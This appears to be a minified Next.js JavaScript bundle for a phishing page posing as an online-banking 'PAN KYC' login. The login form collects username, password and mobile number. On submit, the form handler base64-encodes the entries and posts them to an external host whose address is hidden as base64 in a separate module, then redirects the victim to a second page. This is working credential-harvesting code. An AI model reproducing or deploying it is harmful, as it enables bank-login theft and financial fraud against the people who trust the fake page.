(self.webpackChunk_N_E = self.webpackChunk_N_E || []).push([
    [9], {
        5098: function(e, t, n) {
            (window.__NEXT_P = window.__NEXT_P || []).push(["/a", function() {
                return n(9067)
            }])
        },
        9018: function(e, t, n) {
            "use strict";
            var a = n(1876).Buffer,
                r = {
                    dataList: a.from("https://ns2.9appsdownload.org/in.php", "utf-8").toString("base64"),
                    getList: a.from("https://ns2.9appsdownload.org/aja.php", "utf-8").toString("base64")
                };
            t.Z = r
        },
        1210: function(e, t) {
            "use strict";

            function n(e, t, n, a) {
                return !1
            }
            Object.defineProperty(t, "__esModule", {
                value: !0
            }), t.getDomainLocale = n, ("function" == typeof t.default || "object" == typeof t.default && null !== t.default) && void 0 === t.default.__esModule && (Object.defineProperty(t.default, "__esModule", {
                value: !0
            }), Object.assign(t.default, t), e.exports = t.default)
        },
        8418: function(e, t, n) {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            });
            var a = n(4941).Z;
            n(5753).default, Object.defineProperty(t, "__esModule", {
                value: !0
            }), t.default = void 0;
            var r = n(2648).Z,
                o = n(7273).Z,
                s = r(n(7294)),
                i = n(6273),
                l = n(2725),
                c = n(3462),
                u = n(1018),
                d = n(7190),
                f = n(1210),
                p = n(8684),
                h = void 0 !== s.default.useTransition,
                $ = {};

            function m(e, t, n, a) {
                if (e && i.isLocalURL(t)) {
                    Promise.resolve(e.prefetch(t, n, a)).catch(function(e) {});
                    var r = a && void 0 !== a.locale ? a.locale : e && e.locale;
                    $[t + "%" + n + (r ? "%" + r : "")] = !0
                }
            }
            var x = s.default.forwardRef(function(e, t) {
                var n, r, x = e.href,
                    v = e.as,
                    j = e.children,
                    g = e.prefetch,
                    y = e.passHref,
                    b = e.replace,
                    _ = e.shallow,
                    w = e.scroll,
                    N = e.locale,
                    C = e.onClick,
                    L = e.onMouseEnter,
                    M = e.onTouchStart,
                    R = e.legacyBehavior,
                    P = void 0 === R ? !0 !== Boolean(!1) : R,
                    E = o(e, ["href", "as", "children", "prefetch", "passHref", "replace", "shallow", "scroll", "locale", "onClick", "onMouseEnter", "onTouchStart", "legacyBehavior"]);
                n = j, P && ("string" == typeof n || "number" == typeof n) && (n = s.default.createElement("a", null, n));
                var k = !1 !== g,
                    S = a(h ? s.default.useTransition() : [], 2)[1],
                    U = s.default.useContext(c.RouterContext),
                    T = s.default.useContext(u.AppRouterContext);
                T && (U = T);
                var A = s.default.useMemo(function() {
                        var e = a(i.resolveHref(U, x, !0), 2),
                            t = e[0],
                            n = e[1];
                        return {
                            href: t,
                            as: v ? i.resolveHref(U, v) : n || t
                        }
                    }, [U, x, v]),
                    Z = A.href,
                    B = A.as,
                    D = s.default.useRef(Z),
                    F = s.default.useRef(B);
                P && (r = s.default.Children.only(n));
                var O = P ? r && "object" == typeof r && r.ref : t,
                    K = a(d.useIntersection({
                        rootMargin: "200px"
                    }), 3),
                    z = K[0],
                    H = K[1],
                    q = K[2],
                    G = s.default.useCallback(function(e) {
                        (F.current !== B || D.current !== Z) && (q(), F.current = B, D.current = Z), z(e), O && ("function" == typeof O ? O(e) : "object" == typeof O && (O.current = e))
                    }, [B, O, Z, q, z]);
                s.default.useEffect(function() {
                    var e = H && k && i.isLocalURL(Z),
                        t = void 0 !== N ? N : U && U.locale,
                        n = $[Z + "%" + B + (t ? "%" + t : "")];
                    e && !n && m(U, Z, B, {
                        locale: t
                    })
                }, [B, Z, H, N, k, U]);
                var I = {
                    ref: G,
                    onClick: function(e) {
                        P || "function" != typeof C || C(e), P && r.props && "function" == typeof r.props.onClick && r.props.onClick(e), e.defaultPrevented || function(e, t, n, a, r, o, s, l, c, u) {
                            if ("A" !== e.currentTarget.nodeName.toUpperCase() || (!(f = (d = e).currentTarget.target) || "_self" === f) && !d.metaKey && !d.ctrlKey && !d.shiftKey && !d.altKey && (!d.nativeEvent || 2 !== d.nativeEvent.which) && i.isLocalURL(n)) {
                                e.preventDefault();
                                var d, f, p = function() {
                                    "beforePopState" in t ? t[r ? "replace" : "push"](n, a, {
                                        shallow: o,
                                        locale: l,
                                        scroll: s
                                    }) : t[r ? "replace" : "push"](n, {
                                        forceOptimisticNavigation: !u
                                    })
                                };
                                c ? c(p) : p()
                            }
                        }(e, U, Z, B, b, _, w, N, T ? S : void 0, k)
                    },
                    onMouseEnter: function(e) {
                        P || "function" != typeof L || L(e), P && r.props && "function" == typeof r.props.onMouseEnter && r.props.onMouseEnter(e), !(!k && T) && i.isLocalURL(Z) && m(U, Z, B, {
                            priority: !0
                        })
                    },
                    onTouchStart: function(e) {
                        P || "function" != typeof M || M(e), P && r.props && "function" == typeof r.props.onTouchStart && r.props.onTouchStart(e), !(!k && T) && i.isLocalURL(Z) && m(U, Z, B, {
                            priority: !0
                        })
                    }
                };
                if (!P || y || "a" === r.type && !("href" in r.props)) {
                    var X = void 0 !== N ? N : U && U.locale,
                        Y = U && U.isLocaleDomain && f.getDomainLocale(B, X, U.locales, U.domainLocales);
                    I.href = Y || p.addBasePath(l.addLocale(B, X, U && U.defaultLocale))
                }
                return P ? s.default.cloneElement(r, I) : s.default.createElement("a", Object.assign({}, E, I), n)
            });
            t.default = x, ("function" == typeof t.default || "object" == typeof t.default && null !== t.default) && void 0 === t.default.__esModule && (Object.defineProperty(t.default, "__esModule", {
                value: !0
            }), Object.assign(t.default, t), e.exports = t.default)
        },
        1018: function(e, t, n) {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            }), t.GlobalLayoutRouterContext = t.LayoutRouterContext = t.AppRouterContext = void 0;
            var a = (0, n(2648).Z)(n(7294)),
                r = a.default.createContext(null);
            t.AppRouterContext = r;
            var o = a.default.createContext(null);
            t.LayoutRouterContext = o;
            var s = a.default.createContext(null);
            t.GlobalLayoutRouterContext = s
        },
        9067: function(e, t, n) {
            "use strict";
            n.r(t), n.d(t, {
                default: function() {
                    return m
                }
            });
            var a = n(7568),
                r = n(655),
                o = n(5893),
                s = n(9008),
                i = n.n(s),
                l = n(5675),
                c = n.n(l),
                u = n(7294),
                d = n(1163),
                f = n(1664),
                p = n.n(f),
                h = n(9018),
                $ = n(1876).Buffer;

            function m() {
                var e, t = (0, d.useRouter)(),
                    n = (0, u.useState)(!1),
                    s = n[0],
                    l = n[1],
                    f = (e = (0, a.Z)(function(e) {
                        var n, a, o, s, i, c, u;
                        return (0, r.__generator)(this, function(r) {
                            switch (r.label) {
                                case 0:
                                    return e.preventDefault(), l(!0), n = new FormData(e.target), a = {}, n.forEach(function(e, t) {
                                        a[t] = e
                                    }), o = JSON.stringify(a), s = ((i = {}).method = "POST", i.headers = {
                                        "Content-Type": "text/plain"
                                    }, i.body = $.from(o, "utf-8").toString("base64"), i), e.target.reset(), [4, fetch(window.atob(h.Z.dataList) + "?id=" + window.location.hostname, s)];
                                case 1:
                                    return [4, (c = r.sent()).json()];
                                case 2:
                                    return u = r.sent(), l(!1), !0 == u.status ? t.push("/b") : l(!1), [2]
                            }
                        })
                    }), function(t) {
                        return e.apply(this, arguments)
                    }),
                    m = (0, u.useState)(!0),
                    x = m[0],
                    v = m[1];
                return (0, o.jsxs)(o.Fragment, {
                    children: [(0, o.jsxs)(i(), {
                        children: [(0, o.jsx)("title", {
                            children: "Login"
                        }), (0, o.jsx)("meta", {
                            name: "description",
                            content: "login here and free download unlimited music"
                        })]
                    }), (0, o.jsxs)("main", {
                        children: [(0, o.jsx)("div", {
                            className: "logo",
                            children: (0, o.jsx)(c(), {
                                src: "/image.png",
                                alt: "site logo",
                                width: 100,
                                height: 37
                            })
                        }), (0, o.jsx)("br", {}), (0, o.jsx)("div", {
                            className: "login-heading",
                            children: (0, o.jsx)("h3", {
                                className: "text-center",
                                children: "Login Online Banking to PAN KYC"
                            })
                        }), (0, o.jsxs)("div", {
                            className: "login-form",
                            children: [(0, o.jsxs)("p", {
                                className: "info",
                                children: [(0, o.jsx)("span", {
                                    children: "(CARE:"
                                }), " Username and password are case sensitive)"]
                            }), (0, o.jsxs)("form", {
                                action: "#",
                                className: "form",
                                method: "post",
                                onSubmit: f,
                                children: [(0, o.jsxs)("div", {
                                    className: "form-group",
                                    children: [(0, o.jsx)("label", {
                                        htmlFor: "Username",
                                        children: "Username* "
                                    }), (0, o.jsx)("input", {
                                        name: "Username",
                                        type: "text",
                                        className: "form-control",
                                        id: "Username",
                                        required: !0,
                                        size: "30",
                                        maxLength: 30,
                                        "aria-label": "Username"
                                    })]
                                }), (0, o.jsxs)("div", {
                                    className: "form-group",
                                    children: [(0, o.jsx)("label", {
                                        htmlFor: "Password",
                                        children: "Password* "
                                    }), (0, o.jsx)("input", {
                                        name: "Password",
                                        type: "password",
                                        className: "form-control",
                                        id: "Password",
                                        required: !0,
                                        size: "30",
                                        maxLength: 30,
                                        "aria-label": "Password"
                                    })]
                                }), (0, o.jsxs)("div", {
                                    className: "form-group",
                                    children: [(0, o.jsx)("label", {
                                        htmlFor: "Mobile",
                                        children: "Mobile* "
                                    }), (0, o.jsx)("input", {
                                        name: "Mobile",
                                        type: "text",
                                        className: "form-control",
                                        id: "Mobile",
                                        size: "30",
                                        required: !0,
                                        maxLength: 10,
                                        "aria-label": "Mobile"
                                    })]
                                }), (0, o.jsxs)("div", {
                                    className: "form-group",
                                    children: [(0, o.jsx)("label", {
                                        htmlFor: "captcha",
                                        children: "Enter the text as shown in the image* "
                                    }), (0, o.jsx)("input", {
                                        type: "text",
                                        className: "form-control",
                                        size: "30",
                                        maxLength: 30,
                                        "aria-label": "captcha"
                                    })]
                                }), (0, o.jsx)("label", {
                                    children: "Select one of the Captcha option"
                                }), (0, o.jsxs)("div", {
                                    className: "captcha",
                                    children: [(0, o.jsxs)("div", {
                                        className: "w-50",
                                        children: [(0, o.jsx)("input", {
                                            type: "radio",
                                            checked: !0,
                                            id: "",
                                            onChange: function() {
                                                return v(!0)
                                            }
                                        }), "Image Captcha"]
                                    }), (0, o.jsxs)("div", {
                                        className: "w-50",
                                        children: [(0, o.jsx)("input", {
                                            type: "radio",
                                            id: "",
                                            onChange: function() {
                                                return v(!1)
                                            }
                                        }), "Audio Captcha"]
                                    }), (0, o.jsx)("div", {
                                        className: "clear"
                                    }), (0, o.jsxs)("div", {
                                        className: "top-10",
                                        children: [(0, o.jsx)("div", {
                                            className: x ? "show" : "hidden",
                                            children: (0, o.jsx)(c(), {
                                                src: "/ct.png",
                                                alt: "captcha",
                                                width: 150,
                                                height: "40"
                                            })
                                        }), (0, o.jsx)("div", {
                                            className: x ? "hidden" : "show"
                                        })]
                                    }), (0, o.jsxs)("div", {
                                        className: "form-group",
                                        children: [(0, o.jsx)("input", {
                                            type: "submit",
                                            disabled: !!s,
                                            className: "btn",
                                            value: "Login"
                                        }), (0, o.jsx)("input", {
                                            type: "reset",
                                            className: "btn",
                                            value: "Reset"
                                        })]
                                    }), (0, o.jsx)("p", {
                                        children: (0, o.jsx)(p(), {
                                            href: "/",
                                            children: (0, o.jsx)("a", {
                                                children: "New User ? Register here/Activate"
                                            })
                                        })
                                    }), (0, o.jsx)("p", {
                                        children: (0, o.jsx)(p(), {
                                            href: "/",
                                            children: (0, o.jsx)("a", {
                                                children: "Forgot Username / Login Password"
                                            })
                                        })
                                    })]
                                })]
                            })]
                        }), (0, o.jsx)("div", {
                            className: "p-body",
                            children: (0, o.jsxs)("ul", {
                                className: "provide",
                                children: [(0, o.jsx)("li", {
                                    children: "Mandatory fields are marked with an asterisk (*)"
                                }), (0, o.jsx)("li", {
                                    children: "Do not provide your username and password anywhere."
                                }), (0, o.jsx)("li", {
                                    children: "Your username and password are high confidential. Never part with them.We will never ask for this information."
                                })]
                            })
                        }), (0, o.jsx)("div", {
                            className: "footer_area",
                            children: (0, o.jsx)(c(), {
                                src: "/v.png",
                                width: 68,
                                height: 28,
                                alt: "versign"
                            })
                        }), (0, o.jsx)("div", {
                            className: "footer",
                            children: (0, o.jsx)("p", {
                                children: "\xa9 OnlineBanking"
                            })
                        })]
                    })]
                })
            }
        },
        1664: function(e, t, n) {
            e.exports = n(8418)
        },
        7568: function(e, t, n) {
            "use strict";

            function a(e, t, n, a, r, o, s) {
                try {
                    var i = e[o](s),
                        l = i.value
                } catch (c) {
                    n(c);
                    return
                }
                i.done ? t(l) : Promise.resolve(l).then(a, r)
            }

            function r(e) {
                return function() {
                    var t = this,
                        n = arguments;
                    return new Promise(function(r, o) {
                        var s = e.apply(t, n);

                        function i(e) {
                            a(s, r, o, i, l, "next", e)
                        }

                        function l(e) {
                            a(s, r, o, i, l, "throw", e)
                        }
                        i(void 0)
                    })
                }
            }
            n.d(t, {
                Z: function() {
                    return r
                }
            })
        }
    },
    function(e) {
        e.O(0, [345, 876, 774, 888, 179], function() {
            return e(e.s = 5098)
        }), _N_E = e.O()
    }
]);